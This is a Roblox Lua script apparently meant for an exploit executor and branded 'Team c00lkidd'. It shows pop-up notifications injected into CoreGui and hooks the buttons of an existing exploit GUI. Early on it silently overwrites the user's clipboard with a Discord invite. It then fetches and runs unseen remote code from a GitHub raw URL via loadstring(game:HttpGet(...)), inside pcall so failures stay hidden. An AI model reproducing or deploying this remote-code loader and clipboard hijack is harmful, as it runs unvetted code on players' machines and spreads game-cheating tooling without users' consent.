local msg = Instance.new("Message", workspace)
msg.Text = "Have fun!"
task.delay(2, function()
    msg.Text = "Made by Team c00lkidd"
    task.delay(2, function()
        msg.Text = "Disclaimer: NOT FE!"
        task.delay(2, function()
            msg:Destroy()
            setclipboard("https://discord.gg/gdnzFjDXP")

            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/v1rsG/c00lguiv2/refs/heads/main/c00lguiv2"))()
            end)
        end)
    end)
end)

local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local notificationStack = {}
local maxVisible = 3
local spacing = 10
local width = 220
local height = 60

local function updateNotificationPositions()
    for i, notif in ipairs(notificationStack) do
        notif.Position = UDim2.new(1, -width - 10, 1, -((height + spacing) * i))
    end
end

local function notifyTeamC00lkidd()
    local gui = Instance.new("ScreenGui")
    gui.Name = "TeamC00lkiddNotification_" .. tick()
    gui.ResetOnSpawn = false
    gui.Parent = CoreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, width, 0, height)
    frame.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
    frame.BorderSizePixel = 0
    frame.Position = UDim2.new(1, -width - 10, 1, -((height + spacing) * (#notificationStack + 1)))
    frame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.5, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 20
    title.Text = "Team c00lkidd"
    title.Parent = frame

    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1, 0, 0.5, 0)
    text.Position = UDim2.new(0, 0, 0.5, 0)
    text.BackgroundTransparency = 1
    text.TextColor3 = Color3.fromRGB(255, 255, 255)
    text.Font = Enum.Font.SourceSans
    text.TextSize = 18
    text.Text = "Have fun!"
    text.Parent = frame

    table.insert(notificationStack, frame)
    updateNotificationPositions()

    if #notificationStack > maxVisible then
        local excess = notificationStack[1]
        table.remove(notificationStack, 1)

        local fadeTween = TweenService:Create(excess, TweenInfo.new(1), {BackgroundTransparency = 1})
        for _, child in ipairs(excess:GetChildren()) do
            if child:IsA("TextLabel") then
                TweenService:Create(child, TweenInfo.new(1), {TextTransparency = 1}):Play()
            end
        end
        fadeTween:Play()
        fadeTween.Completed:Connect(function()
            excess.Parent:Destroy()
            updateNotificationPositions()
        end)
    end

    task.delay(4, function()
        local fadeTween = TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1})
        TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 1}):Play()
        TweenService:Create(text, TweenInfo.new(1), {TextTransparency = 1}):Play()
        fadeTween:Play()
        fadeTween.Completed:Connect(function()
            gui:Destroy()
            for i, notif in ipairs(notificationStack) do
                if notif == frame then
                    table.remove(notificationStack, i)
                    break
                end
            end
            updateNotificationPositions()
        end)
    end)
end

for _, button in ipairs(CoreGui:WaitForChild("GridUI"):WaitForChild("MainFrame"):GetChildren()) do
    if button:IsA("TextButton") then
        button.MouseButton1Click:Connect(notifyTeamC00lkidd)
    end
end
          
